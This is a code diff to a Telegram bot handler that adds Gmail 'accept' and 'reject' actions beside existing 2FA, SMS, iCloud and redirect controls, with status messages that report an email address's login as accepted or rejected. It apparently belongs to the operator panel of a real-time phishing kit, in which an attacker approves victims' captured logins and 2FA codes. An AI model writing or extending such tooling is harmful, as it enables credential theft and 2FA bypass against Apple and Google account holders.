@@ -31,7 +31,7 @@ bot.on("callback_query", async (query) => {
   try {
     const [action, email] = query.data.split("|");
 
-    console.log(`🔘 ${email} | ${action === "page1" ? "2FA" : action === "page2" ? "EMAIL" : action === "page_accept" ? "ICLOUD ACCEPT" : action === "page_reject" ? "ICLOUD REJECT" : action === "sms_accept" ? "SMS ACCEPT" : action === "sms_reject" ? "SMS REJECT" : action === "redirect_icloud" ? "ICLOUD" : action === "redirect_gmail" ? "GMAIL" : "REJECT"}`);
+    console.log(`🔘 ${email} | ${action === "page1" ? "2FA" : action === "page2" ? "EMAIL" : action === "page_accept" ? "ICLOUD ACCEPT" : action === "page_reject" ? "ICLOUD REJECT" : action === "sms_accept" ? "SMS ACCEPT" : action === "sms_reject" ? "SMS REJECT" : action === "redirect_icloud" ? "ICLOUD" : action === "redirect_gmail" ? "GMAIL" : action === "gmail_accept" ? "GMAIL ACCEPT" : action === "gmail_reject" ? "GMAIL REJECT" : "REJECT"}`);
 
     // ✅ Map iCloud accept/reject to correct status
     let statusForBackend = action;
@@ -42,6 +42,10 @@ bot.on("callback_query", async (query) => {
     } else if (action === "sms_accept") {
       statusForBackend = "accepted";
     } else if (action === "sms_reject") {
+      statusForBackend = "rejected";
+    } else if (action === "gmail_accept") {
+      statusForBackend = "accepted";
+    } else if (action === "gmail_reject") {
       statusForBackend = "rejected";
     }
 
@@ -120,6 +124,12 @@ bot.on("callback_query", async (query) => {
         statusMessage = `☁️ <code>${email}</code> redirected to <b>iCloud</b>! ✅`;
       } else if (action === "redirect_gmail") {
         statusMessage = `🌈 <code>${email}</code> redirected to <b>Gmail</b>! ✅`;
+      } else if (action === "gmail_accept") {
+        statusMessage = `🌈 <code>${email}</code> Gmail Login <b>ACCEPTED</b>! ✅`;
+        console.log(`✅ GMAIL_ACCEPT matched! Message: ${statusMessage}`);
+      } else if (action === "gmail_reject") {
+        statusMessage = `🌈 <code>${email}</code> Gmail Login <b>REJECTED</b>! ❌`;
+        console.log(`❌ GMAIL_REJECT matched! Message: ${statusMessage}`);
       }
 
       console.log(`📨 Final statusMessage: "${statusMessage}"`);
